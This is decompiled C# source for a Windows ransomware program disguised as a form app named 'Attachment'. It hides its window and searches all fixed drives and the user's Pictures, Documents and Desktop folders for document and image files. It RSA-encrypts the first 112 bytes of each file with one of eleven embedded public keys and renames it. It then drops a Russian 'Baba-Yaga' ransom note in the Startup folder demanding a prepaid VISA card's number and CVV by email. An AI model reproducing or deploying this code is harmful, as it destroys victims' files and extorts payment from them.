using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Threading;
using System.Windows.Forms;

namespace Attachment;

public class Form1 : Form
{
	private IContainer components = null;

	public static string fName1;

	public static string fName2;

	public static int blockSize = 112;

	private static string keyCode;

	private static byte[] file;

	private static byte[] b1;

	private static byte[] b2;

	private static byte[] e;

	private static byte[] c;

	private static string[] pubKeys = new string[11];

	private static string[] code = new string[11];

	private static string publicKey;

	private static string privateKey;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 262));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		new Mutex(initiallyOwned: true, "GlobalMutexOfMyTestApplication", out var createdNew);
		if (!createdNew)
		{
			Environment.Exit(1);
		}
		loadKeys();
		GetDrives();
		addNote();
		((Form)this).Close();
	}

	private void GetDrives()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.DriveType == DriveType.Fixed)
			{
				getDirs(driveInfo.Name);
			}
		}
		SelectFiles(folderPath);
		SelectFiles(folderPath2);
		SelectFiles(folderPath3);
	}

	private static void getDirs(string pth)
	{
		string[] directories = Directory.GetDirectories(pth);
		string[] array = directories;
		foreach (string fld in array)
		{
			SelectFiles(fld);
		}
	}

	private static void SelectFiles(string fld)
	{
		try
		{
			string[] files = Directory.GetFiles(fld, "*.jpg", SearchOption.AllDirectories);
			string[] array = files;
			for (int i = 0; i < array.Length; i++)
			{
				string text = (fName1 = array[i]);
				fName2 = fName1 + "c";
				SplitFile();
			}
			string[] files2 = Directory.GetFiles(fld, "*.doc", SearchOption.AllDirectories);
			array = files2;
			for (int i = 0; i < array.Length; i++)
			{
				string text = (fName1 = array[i]);
				fName2 = fName1 + "c";
				SplitFile();
			}
			string[] files3 = Directory.GetFiles(fld, "*.xls", SearchOption.AllDirectories);
			array = files3;
			for (int i = 0; i < array.Length; i++)
			{
				string text = (fName1 = array[i]);
				fName2 = fName1 + "c";
				SplitFile();
			}
			string[] files4 = Directory.GetFiles(fld, "*.docx", SearchOption.AllDirectories);
			array = files4;
			for (int i = 0; i < array.Length; i++)
			{
				string text = (fName1 = array[i]);
				fName2 = fName1 + "c";
				SplitFile();
			}
			string[] files5 = Directory.GetFiles(fld, "*.xlsx", SearchOption.AllDirectories);
			array = files5;
			for (int i = 0; i < array.Length; i++)
			{
				string text = (fName1 = array[i]);
				fName2 = fName1 + "c";
				SplitFile();
			}
			Directory.GetFiles(fld, "*.zip", SearchOption.AllDirectories);
			array = files5;
			for (int i = 0; i < array.Length; i++)
			{
				string text = (fName1 = array[i]);
				fName2 = fName1 + "c";
				SplitFile();
			}
			Directory.GetFiles(fld, "*.png", SearchOption.AllDirectories);
			array = files5;
			for (int i = 0; i < array.Length; i++)
			{
				string text = (fName1 = array[i]);
				fName2 = fName1 + "c";
				SplitFile();
			}
			Directory.GetFiles(fld, "*.bmp", SearchOption.AllDirectories);
			array = files5;
			for (int i = 0; i < array.Length; i++)
			{
				string text = (fName1 = array[i]);
				fName2 = fName1 + "c";
				SplitFile();
			}
			Directory.GetFiles(fld, "*.7z", SearchOption.AllDirectories);
			array = files5;
			for (int i = 0; i < array.Length; i++)
			{
				string text = (fName1 = array[i]);
				fName2 = fName1 + "c";
				SplitFile();
			}
			Directory.GetFiles(fld, "*.rar", SearchOption.AllDirectories);
			array = files5;
			for (int i = 0; i < array.Length; i++)
			{
				string text = (fName1 = array[i]);
				fName2 = fName1 + "c";
				SplitFile();
			}
			Directory.GetFiles(fld, "*.pdf", SearchOption.AllDirectories);
			array = files5;
			for (int i = 0; i < array.Length; i++)
			{
				string text = (fName1 = array[i]);
				fName2 = fName1 + "c";
				SplitFile();
			}
			Directory.GetFiles(fld, "*.ppt", SearchOption.AllDirectories);
			array = files5;
			for (int i = 0; i < array.Length; i++)
			{
				string text = (fName1 = array[i]);
				fName2 = fName1 + "c";
				SplitFile();
			}
			Directory.GetFiles(fld, "*.pptx", SearchOption.AllDirectories);
			array = files5;
			for (int i = 0; i < array.Length; i++)
			{
				string text = (fName1 = array[i]);
				fName2 = fName1 + "c";
				SplitFile();
			}
		}
		catch
		{
		}
	}

	public void encodeFile()
	{
		file = File.ReadAllBytes(fName1);
		e = blockEncode(file);
		File.WriteAllBytes(fName1, e);
	}

	public static void SplitFile()
	{
		try
		{
			file = File.ReadAllBytes(fName1);
			b1 = new byte[blockSize];
			b2 = new byte[file.Length - b1.Length];
			e = new byte[blockSize + 16];
			c = new byte[e.Length + b2.Length];
			Array.Copy(file, b1, blockSize);
			Array.Copy(file, blockSize, b2, 0, file.Length - blockSize);
			e = blockEncode(b1);
			Array.Copy(e, c, blockSize + 16);
			Array.Copy(b2, 0, c, blockSize + 16, b2.Length);
			File.WriteAllBytes(fName1, c);
			File.Move(fName1, fName2);
		}
		catch
		{
		}
	}

	private void loadKeys()
	{
		pubKeys[0] = "<RSAKeyValue><Modulus>1FSttj/ziZsuxi6+WMU578+DiilWH+lzbD7eGKSyOFHWUtdMGV2YqE6B9112WGIgkhMRSs0PXhzLXie23TM6srdPE5Nm7NcIBWhSX0emQ9bvcuQ3YZQcH+sFnweNq0OSzKMDmA2SeshzJhv+yCsaJhqYnMRhk/Um4WXiFfn+d10=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
		pubKeys[1] = "<RSAKeyValue><Modulus>sLBAQPrni/60Y2529OuojBVt4nI7ZqDRm2GFaWjtXF8IL3v2wB3gTdbNlVTkkQko3RpjfHfmuU1lhx71n6Hc0uW+ybFmy3pXId43b5rqIc5eb5VKp6VLsuJ6RkAgKxvJ//FcpQa6jQ2XtJZxCwo5UCaTzLZvN3gW8nuALf37JJ8=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
		pubKeys[2] = "<RSAKeyValue><Modulus>67mIHShF1haTG0smGjGMy+vk0c0dPkAd5OR+xssNF4/mgQLHeGMensx95yzN+VauLvBBgjrtf8OxZbfY4zL1Gc9doAfSgaEUlc89yvucUaA7awXlKift6WEzGU3i0OfTbDY65V1dbGdVwUyF34HMtBUyBMBw+LBVYryurGjVVuk=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
		pubKeys[3] = "<RSAKeyValue><Modulus>kg0LDf6TpBtWcB+0cabt8o1+CKu18u+2yvbiEOoXxW8HyFbHuyHxS2MrGYOseCrvjj47/8XUcTcgz0dOubZt0g8/pFbV3zP6t6VzsbwlYzOto08ute5S2nBV6BG0XHFHHu6ZNHc6QTaQAlTDAEehR7P7RpTsPBj1uhtrqSXld+M=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
		pubKeys[4] = "<RSAKeyValue><Modulus>pEY++NyKmAGKWcuGP43TD06M7P1ixGIQFw158rbdwOx5W34Ect+1Eu/Ng1YszFCZzx5OVxq49lO3jMpcQYtRw/RcFPKG6n7S8ceTZRulcIe5w7BBZz7/F4hRjr0I3AqjxkXNtfGwOuLRzhsE/tGiOu6cNDLr8aS0JOJhsI+hrIc=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
		pubKeys[5] = "<RSAKeyValue><Modulus>4s7BMgYyT6OUqidi3FTikkedq/czSbdyovd09n1YXPvcfAFXsiGdLK9ya8T6wfqpvfMlzoSArKQiF8/nvCtKdQCseebIVdCxpbXXQwKNPZ8jCXvjx4Yuzphiwe7m0ddmlxArairDWvGQAeoThufi5oOvCAxgbiYkbKZHZ8fDWa8=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
		pubKeys[6] = "<RSAKeyValue><Modulus>txK43nVmJNCvoIp1iE9jr9yjAZD94t98RAVq1FHRyPh9qxvb3woTN/uDksrf1rL9OL8egrvYJ0FGdQgrfOhToKPq0epF/hcHd9KkH2U6T4nZ43FHuiOFMifeICkih0ST0ufyy3ZlLk7+Im956vlBHzmcP7yGyArybN4lBrWKYv0=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
		pubKeys[7] = "<RSAKeyValue><Modulus>oKQPrPmg+qEw7zVeLVUh6asGWBZ3/6eEqoG9zU53EeczCZe43Fk3+RxsfXN8h5vmrNbVMVPTPn9fUCAhwCkMBvbsUE4IMz0972Ebo7AYroufmO9yTke2cV0Iu3H12ektcquYsflSjAjNzpFK/DPjX3WeL9fqu3nYwpaPie7JMXc=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
		pubKeys[8] = "<RSAKeyValue><Modulus>hhBmC1YWaQxJ4xDCCtGAVGifpY5uwR/+Yoh8RXJ7x+ZWTDJH+C28DXy68WlLDxwEVHnHmz/xfb67hswr2S/KEgDoFD3Efo+rlBS90w3WwpsSXQZbFlFz/igZps+dd2sA2/OZ0m0mnoyRO7XA1fZHRBCAL3C12csVYPoXskoXnoU=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
		pubKeys[9] = "<RSAKeyValue><Modulus>wNOZrCzOKT8tMGwvzHQaTN+l7uqJdRXPXhaMefGlFM7f6aJBbp6nDPYtg4Cavg7LSbCfLwYtZx5stObHvXVoWteYqsI7v7JNrZ1EMN94Q0AJmmia5Ttv+pdbme1P/26hMFOkeyDjXpfQM9zfUj2mGptPelgGArtogNTPXcUvG68=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
		pubKeys[10] = "<RSAKeyValue><Modulus>oHGCU8xDI0zgwnafUJi6lPnAZreSh9LP46OFJJ8P2bGVxe4bh5WMDoQJPVnUzNEYTCTwsz5L+wvFobUgYzjP5tmZnH1616re2n1+zy3SSrOzI9iuPm0AeAfm/CVBKLAAdokIELQJMCafi3hR/NNNxW/eME9/lLjhD8PU3O8lu6k=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
		code[0] = "AMA";
		code[1] = "ASW";
		code[2] = "REQ";
		code[3] = "TQW";
		code[4] = "PIO";
		code[5] = "TIN";
		code[6] = "VFR";
		code[7] = "BOZ";
		code[8] = "KLF";
		code[9] = "HTR";
		code[10] = "RED";
		Random random = new Random();
		int num = random.Next() % 11;
		publicKey = pubKeys[num];
		keyCode = code[num];
	}

	private void GenerateKeyIV()
	{
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		publicKey = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: false);
		privateKey = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: true);
		File.WriteAllText("public.xml", publicKey);
		File.WriteAllText("private.xml", privateKey);
	}

	private static byte[] blockEncode(byte[] block)
	{
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		rSACryptoServiceProvider.FromXmlString(publicKey);
		return rSACryptoServiceProvider.Encrypt(block, fOAEP: false);
	}

	private static void addNote()
	{
		Process process = new Process();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		StreamWriter streamWriter = new StreamWriter(folderPath + "\\note.txt");
		streamWriter.WriteLine("Привет!");
		streamWriter.WriteLine("Баба-Яга украла ваши файлы! У старушки маленькая пенсия но добрая душа и она поможет вам расшифровать вам ваше добро.");
		streamWriter.WriteLine("Для этого вам необходимо выполнить следующие действия:");
		streamWriter.WriteLine("1. Приобретите предоплаченную карту VISA (prepaired VISA) номиналом $60 на сайтах www.100plat.ru, www.plati.ru или любым удобным для вас способом");
		streamWriter.WriteLine("2. На почту arbtrg@email.com вышлите номер этой карты, срок действия и CVV-код, а так же кодовое слово - " + keyCode);
		streamWriter.WriteLine("3. ВНИМАНИЕ! Без кодового слова бабушка не сможет вам помочь!");
		streamWriter.WriteLine("4. В ответном письме вы получите утилиту для расшифровки файлов.");
		streamWriter.WriteLine("5. Попытавшись исправить файлы самостоятельно вы можете их испортить непоправимо и даже бабушка-Яга вам не сможет помочь.");
		streamWriter.Close();
		process.StartInfo.FileName = "notepad.exe";
		process.StartInfo.Arguments = folderPath + "\\note.txt";
		process.Start();
	}
}
